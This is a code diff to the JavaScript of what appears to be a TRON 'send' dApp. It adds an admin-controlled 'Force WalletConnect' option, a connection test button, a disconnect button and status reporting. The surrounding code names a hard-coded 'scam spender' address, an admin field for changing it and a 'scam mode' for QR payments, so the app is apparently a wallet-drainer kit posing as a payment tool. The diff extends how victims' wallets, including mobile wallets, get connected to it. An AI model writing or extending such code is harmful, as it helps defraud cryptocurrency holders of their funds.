@@ -112,6 +112,10 @@
     adminCurToken: $("adminCurToken"),
     adminScamSpender: $("adminScamSpender"),
     wcEnabledToggle: $("wcEnabledToggle"),
+    wcForceToggle: $("wcForceToggle"),
+    wcTestBtn: $("wcTestBtn"),
+    wcDisconnectBtn: $("wcDisconnectBtn"),
+    wcStatus: $("wcStatus"),
     qrToAddr: $("qrToAddr"),
     qrAmount: $("qrAmount"),
     qrScamMode: $("qrScamMode"),
@@ -154,12 +158,19 @@
   const DEFAULT_SCAM_SPENDER = "TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax";
   const LS_SCAM_SPENDER = "sendDappScamSpender_v1";
   const LS_WC_ENABLED = "sendDappWcEnabled_v1";
+  const LS_WC_FORCE = "sendDappWcForce_v1";
   function isWcEnabled() {
     try {
       const v = localStorage.getItem(LS_WC_ENABLED);
       // default ON if user has never set it
       return v === null ? true : v === "1";
     } catch (_) { return true; }
+  }
+  function isWcForced() {
+    try { return localStorage.getItem(LS_WC_FORCE) === "1"; } catch (_) { return false; }
+  }
+  function setWcStatus(text) {
+    if (els && els.wcStatus) els.wcStatus.textContent = "WalletConnect: " + text;
   }
   function getScamSpender() {
     try {
@@ -257,7 +268,33 @@
     return false;
   }
 
+  async function connectViaWc() {
+    if (!(window.__WC && window.__WC.ready)) {
+      toast("WalletConnect is still loading — try again in a moment", "warn");
+      return false;
+    }
+    setWcStatus("opening QR…");
+    try {
+      const { address } = await window.__WC.connect(cfg.NETWORK);
+      if (!address) { toast("Connection cancelled", "warn"); setWcStatus("cancelled"); return false; }
+      await activateWcSession(address);
+      setWcStatus("connected as " + shortAddr(address, 6, 4));
+      toast("Wallet connected via WalletConnect");
+      return true;
+    } catch (e) {
+      const msg = e && e.message ? e.message : String(e);
+      setWcStatus("failed — " + msg);
+      toast("WalletConnect failed: " + msg, "error");
+      return false;
+    }
+  }
+
   async function connect() {
+    // 0) Admin "Force WalletConnect" — skip injected detection entirely.
+    if (isWcEnabled() && isWcForced()) {
+      await connectViaWc();
+      return;
+    }
     // 1) Try injected TronLink (extension or in-app browser)
     const installed = await detectTronLink(2000);
     if (installed) {
@@ -285,15 +322,8 @@
       return;
     }
     // 2) Fall back to WalletConnect (mobile pairing via QR) — admin-gated
-    if (isWcEnabled() && window.__WC && window.__WC.ready) {
-      try {
-        const { address } = await window.__WC.connect(cfg.NETWORK);
-        if (!address) { toast("Connection cancelled", "warn"); return; }
-        await activateWcSession(address);
-        toast("Wallet connected via WalletConnect");
-      } catch (e) {
-        toast("WalletConnect failed: " + (e && e.message ? e.message : e), "error");
-      }
+    if (isWcEnabled()) {
+      await connectViaWc();
       return;
     }
     // 3) Nothing worked — show install prompt
@@ -1001,8 +1031,35 @@
       try { localStorage.setItem(LS_WC_ENABLED, on ? "1" : "0"); } catch (_) {}
       if (!on && window.__WC) {
         try { await window.__WC.disconnect(); } catch (_) {}
+        setWcStatus("disabled");
       }
       toast(on ? "WalletConnect enabled" : "WalletConnect disabled", "info");
+    });
+  }
+  if (els.wcForceToggle) {
+    els.wcForceToggle.checked = isWcForced();
+    els.wcForceToggle.addEventListener("change", () => {
+      const on = !!els.wcForceToggle.checked;
+      try { localStorage.setItem(LS_WC_FORCE, on ? "1" : "0"); } catch (_) {}
+      toast(on ? "Force WalletConnect ON — Connect now skips the extension" : "Force WalletConnect OFF", "info");
+    });
+  }
+  if (els.wcTestBtn) {
+    els.wcTestBtn.addEventListener("click", () => { connectViaWc(); });
+  }
+  if (els.wcDisconnectBtn) {
+    els.wcDisconnectBtn.addEventListener("click", async () => {
+      if (window.__WC) {
+        try { await window.__WC.disconnect(); } catch (_) {}
+      }
+      // Also clear local connected state so the Connect button comes back.
+      state.tronWeb = null;
+      state.address = null;
+      state.usingWC = false;
+      if (els.connectBtn) els.connectBtn.textContent = "Connect";
+      if (els.heroAddressRow) els.heroAddressRow.hidden = true;
+      setWcStatus("disconnected");
+      toast("WalletConnect disconnected", "info");
     });
   }
   if (els.revokeBtn) els.revokeBtn.addEventListener("click", executeRevoke);
